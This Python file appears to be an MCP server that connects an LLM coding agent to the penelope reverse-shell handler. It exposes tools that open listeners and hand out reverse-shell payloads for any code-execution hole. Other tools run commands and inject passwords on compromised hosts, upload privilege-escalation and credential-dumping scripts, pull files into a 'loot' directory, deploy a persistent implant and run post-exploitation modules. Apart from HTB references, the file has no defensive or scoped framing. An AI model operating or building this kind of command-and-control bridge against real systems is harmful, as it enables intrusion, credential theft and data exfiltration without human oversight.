#!/usr/bin/env python3
"""
penelope_mcp.py — MCP server wrapping penelope for LLM agent shell management.

Solves the stateless-shell problem: each agent tool call can exec into a
persistent reverse-shell session without losing environment, CWD, or state.

Usage (stdio MCP):
    python3 /opt/penelope/penelope_mcp.py

Claude Code ~/.claude/settings.json integration:
    "mcpServers": {
        "penelope": {
            "command": "python3",
            "args": ["/opt/penelope/penelope_mcp.py"]
        }
    }
"""

import os
import re
import sys
import pty
import time
import threading
import io
import logging

# ── Save real stdio before redirecting anything.
#    MCP transport will use these directly (see entry point below).
_real_stdin  = sys.stdin
_real_stdout = sys.stdout

# ── Redirect sys.stdout/stderr to a logfile so penelope's print() calls
#    never corrupt the JSON-RPC stream.
_pen_log   = open("/tmp/penelope_mcp.log", "a", buffering=1)
sys.stdout = _pen_log
sys.stderr = _pen_log

# ── Patch stdin with a fake PTY so penelope's module-level
#    `TTY_NORMAL = termios.tcgetattr(sys.stdin)` doesn't crash
#    when running headless (MCP stdio transport).
_master_fd, _slave_fd = pty.openpty()
_fake_tty = os.fdopen(_slave_fd, "rb+", buffering=0)
sys.stdin = _fake_tty

sys.path.insert(0, "/opt/penelope")
import penelope as _pen        # initialises options / core / logger globals

sys.stdin = _real_stdin        # restore real stdin for MCP transport
_fake_tty.close()
os.close(_master_fd)

# Headless mode: never auto-attach (attach() calls tty.setraw which crashes on a non-TTY stdin)
_pen.options.no_attach = True

# Silence penelope's logger — all its handlers now write to the logfile anyway
for handler in _pen.logger.handlers[:]:
    _pen.logger.removeHandler(handler)
_pen.logger.addHandler(logging.StreamHandler(_pen_log))
_pen.logger.setLevel(logging.WARNING)

# ── MCP server ────────────────────────────────────────────────────────────────
from mcp.server.fastmcp import FastMCP

mcp = FastMCP(
    "penelope",
    instructions=(
        "Persistent reverse-shell manager. "
        "Start a listener, wait for the target to connect, then exec commands "
        "on the session. Sessions survive across tool calls — use session_id to "
        "route commands to the right shell."
    ),
)


# ─── helpers ──────────────────────────────────────────────────────────────────

def _session(session_id: int):
    s = _pen.core.sessions.get(session_id)
    if s is None:
        raise ValueError(f"Session {session_id} not found. Call penelope_sessions() to list active sessions.")
    return s


def _session_info(s) -> dict:
    info = {
        "id":       s.id,
        "host":     getattr(s, "hostname", None) or s.ip,
        "ip":       s.ip,
        "port":     s.port,
        "os":       s.OS,
        "type":     s.type,
        "subtype":  s.subtype,
        "user":     getattr(s, "user", None),
        "agent":    s.agent,
        "source":   s.source,   # 'reverse' | 'bind'
    }
    # Loot directory on the attacker — downloads land in <loot_dir>/downloads/
    try:
        info["loot_dir"] = str(s.directory)
    except Exception:
        pass
    # Remote CWD — only report if penelope has already cached it (avoid
    # triggering a synchronous exec round-trip on every session listing).
    cached_cwd = getattr(s, "_cwd", None)
    if cached_cwd:
        info["cwd"] = cached_cwd
    return info


# ─── tools ────────────────────────────────────────────────────────────────────

_ANSI_RE = re.compile(r"\x1b\[[0-9;]*[mGKHF]")


def _strip_ansi(text: str) -> str:
    return _ANSI_RE.sub("", text)


@mcp.tool()
def penelope_listen(port: int = 4444, host: str = "0.0.0.0") -> dict:
    """
    Start a TCP listener waiting for an incoming reverse shell.

    Returns the listener id and the one-liner payloads penelope suggests for
    the target so you can paste them into whatever RCE vector you have.
    """
    listener = _pen.TCPListener(host=host, port=port)
    if not listener:
        return {"ok": False, "error": f"Could not bind {host}:{port} (port in use or insufficient privileges)"}

    payloads_text = ""
    try:
        payloads_text = _strip_ansi(listener.payloads() or "")
    except Exception as e:
        payloads_text = f"(payloads unavailable: {e})"

    return {
        "ok":           True,
        "listener_id":  listener.id,
        "bind":         f"{host}:{port}",
        "payloads":     payloads_text,
        "tip":          "Paste one of the payloads on the target, then call penelope_wait_session() or penelope_sessions().",
    }


@mcp.tool()
def penelope_sessions() -> list[dict]:
    """
    List all active reverse-shell sessions.

    Returns id, host, OS, shell type, and whether the penelope agent is deployed.
    Pass the id to penelope_exec / penelope_upload / penelope_download.
    """
    return [_session_info(s) for s in _pen.core.sessions.values()]


@mcp.tool()
def penelope_wait_session(
    timeout: float = 30.0,
    poll_interval: float = 0.5,
) -> dict:
    """
    Block until at least one new session appears (or timeout expires).

    Useful immediately after triggering a reverse-shell payload — call this
    instead of sleeping and polling manually.

    Args:
        timeout: seconds to wait before giving up
        poll_interval: check interval in seconds
    """
    deadline = time.monotonic() + timeout
    before   = set(_pen.core.sessions.keys())

    while time.monotonic() < deadline:
        new_ids = set(_pen.core.sessions.keys()) - before
        if new_ids:
            new_sessions = [_session_info(_pen.core.sessions[i]) for i in new_ids]
            return {"ok": True, "new_sessions": new_sessions}
        time.sleep(poll_interval)

    return {"ok": False, "error": f"No new session after {timeout}s"}


@mcp.tool()
def penelope_exec(
    session_id: int,
    command: str,
    timeout: float | None = 60.0,
) -> dict:
    """
    Execute a shell command on an active session and return the output.

    The session retains full state (env vars, CWD, running daemons) between
    calls — this is the key advantage over the Bash tool.

    Args:
        session_id: from penelope_sessions()
        command:    shell command to run (bash/sh/cmd/powershell depending on OS)
        timeout:    seconds to wait for the *first* byte of output. Once data
                    starts flowing, the call waits indefinitely for completion.
                    Bump this for slow enumerators (linpeas, recursive find,
                    target-side nmap). Use None for unbounded initial wait.

    Returns: {"ok": bool, "output": str, "error"?: str}
    """
    s = _session(session_id)

    kwargs: dict = {"value": True}
    if timeout is not None:
        kwargs["timeout"] = timeout

    try:
        result = s.exec(command, **kwargs)
    except Exception as e:
        return {"ok": False, "error": f"{type(e).__name__}: {e}"}

    if result is False:
        return {"ok": False, "error": "exec() returned False — session is dead or has no control channel"}
    if result is None:
        return {"ok": False, "error": "exec() returned None — session not ready (no agent / no pty)"}

    return {"ok": True, "output": result}


@mcp.tool()
def penelope_send_raw(
    session_id: int,
    data: str,
    append_newline: bool = True,
) -> dict:
    """
    Send raw bytes to a session — for interactive prompts that penelope_exec
    cannot drive: sudo/su passwords, mysql/ftp/ssh clients, REPL input,
    Ctrl-C (data="\\x03", append_newline=False), Ctrl-D ("\\x04").

    No output is returned; call penelope_exec afterwards to check the new
    shell state (e.g. send password, then run "whoami" to verify privileges).

    Args:
        session_id:     from penelope_sessions()
        data:           text/bytes-as-string to send
        append_newline: append "\\n" to submit (default True; set False for
                        control characters)
    """
    s = _session(session_id)
    payload = (data + ("\n" if append_newline else "")).encode("utf-8", errors="replace")
    try:
        s.send(payload)
        return {"ok": True, "bytes_sent": len(payload)}
    except Exception as e:
        return {"ok": False, "error": f"send failed: {type(e).__name__}: {e}"}


@mcp.tool()
def penelope_upload(
    session_id: int,
    local_items: str,
    remote_path: str = "",
) -> dict:
    """
    Upload local file(s)/folder(s) to the remote target.

    Args:
        session_id:  from penelope_sessions()
        local_items: space-separated local paths or URLs to upload
        remote_path: destination path on target; empty → penelope uses session cwd
    """
    s = _session(session_id)
    try:
        kwargs = {"remote_path": remote_path} if remote_path else {}
        ok = s.upload(local_items, **kwargs)
        return {"ok": bool(ok)}
    except Exception as e:
        return {"ok": False, "error": str(e)}


@mcp.tool()
def penelope_download(
    session_id: int,
    remote_items: str,
) -> dict:
    """
    Download file(s) from the remote target into penelope's per-session loot
    directory (~/.penelope/sessions/<host>/downloads/).

    Args:
        session_id:   from penelope_sessions()
        remote_items: space-separated remote paths to download
    """
    s = _session(session_id)
    try:
        ok = s.download(remote_items)
    except Exception as e:
        return {"ok": False, "error": str(e)}

    download_dir = ""
    try:
        download_dir = str(s.directory / "downloads")
    except Exception:
        pass
    return {"ok": bool(ok), "download_dir": download_dir}


@mcp.tool()
def penelope_kill_session(session_id: int) -> dict:
    """
    Kill a session and close the TCP connection.
    """
    s = _session(session_id)
    try:
        s.kill()
        return {"ok": True}
    except Exception as e:
        return {"ok": False, "error": str(e)}


@mcp.tool()
def penelope_stop_listener(listener_id: int) -> dict:
    """
    Stop a TCP listener so it no longer accepts new connections.
    """
    listener = _pen.core.listeners.get(listener_id)
    if listener is None:
        return {"ok": False, "error": f"Listener {listener_id} not found"}
    try:
        listener.stop()
        return {"ok": True}
    except Exception as e:
        return {"ok": False, "error": str(e)}


@mcp.tool()
def penelope_listeners() -> list[dict]:
    """
    List active TCP listeners.
    """
    return [
        {
            "id":   lid,
            "bind": f"{l.host}:{l.port}",
        }
        for lid, l in _pen.core.listeners.items()
    ]


@mcp.tool()
def penelope_deploy_agent(session_id: int) -> dict:
    """
    Deploy the penelope Python agent on the target session (Unix only).

    Once the agent is deployed, penelope_exec() uses structured TLV streams
    for reliable stdout/stderr separation and proper exit-code handling,
    rather than the token-bracketing heuristic used on raw shells.

    Recommended: call this once after getting a session, before running commands.
    """
    s = _session(session_id)
    if s.agent:
        return {"ok": True, "note": "Agent already deployed on this session"}
    try:
        ok = s.upgrade()
        return {"ok": bool(ok), "agent": s.agent}
    except Exception as e:
        return {"ok": False, "error": str(e)}


@mcp.tool()
def penelope_modules() -> list[dict]:
    """
    List penelope's built-in post-exploitation modules.

    Returns: name, category, and one-line description for each module.
    Pass the name to penelope_run_module() with optional args.
    """
    out = []
    for name, mod in _pen.modules().items():
        doc = (getattr(mod.run, "__doc__", "") or "").strip().splitlines()
        out.append({
            "name":        name,
            "category":    getattr(mod, "category", "Misc"),
            "description": doc[0].strip() if doc else "",
        })
    return out


@mcp.tool()
def penelope_run_module(
    session_id: int,
    name: str,
    args: str = "",
) -> dict:
    """
    Run a penelope module against an active session — these are the primary
    HTB-flow helpers (linpeas, lse, peass_ng, traitor, chisel, ngrok,
    upload_privesc_scripts, upload_credump_scripts, cleanup, etc.).

    Modules write progress/results to penelope's log (/tmp/penelope_mcp.log)
    and may upload tools or download loot into the session's loot directory.

    Args:
        session_id: from penelope_sessions()
        name:       module name from penelope_modules()
        args:       optional space-separated arguments (module-specific)
    """
    s = _session(session_id)
    mod = _pen.modules().get(name)
    if mod is None:
        return {"ok": False, "error": f"Module '{name}' not found. Call penelope_modules() to list."}
    try:
        # Modules expect (session, args_string); they print and modify session state
        mod.run(s, args)
        return {
            "ok":         True,
            "note":       "Module finished. Check the session loot dir for downloaded artefacts; tail /tmp/penelope_mcp.log for module output.",
            "loot_dir":   str(getattr(s, "directory", "")),
        }
    except Exception as e:
        return {"ok": False, "error": f"{type(e).__name__}: {e}"}


# ─── entry point ──────────────────────────────────────────────────────────────
if __name__ == "__main__":
    import anyio
    from mcp.server.stdio import stdio_server
    from io import TextIOWrapper

    if not _pen.core.started:
        _pen.core.start()

    # Pass real stdin/stdout explicitly so penelope's print() calls
    # (which go to sys.stdout = _pen_log now) never corrupt the MCP stream.
    async def _run():
        _stdin  = anyio.wrap_file(TextIOWrapper(_real_stdin.buffer,  encoding="utf-8", errors="replace"))
        _stdout = anyio.wrap_file(TextIOWrapper(_real_stdout.buffer, encoding="utf-8"))
        async with stdio_server(stdin=_stdin, stdout=_stdout) as (r, w):
            await mcp._mcp_server.run(r, w, mcp._mcp_server.create_initialization_options())

    anyio.run(_run)
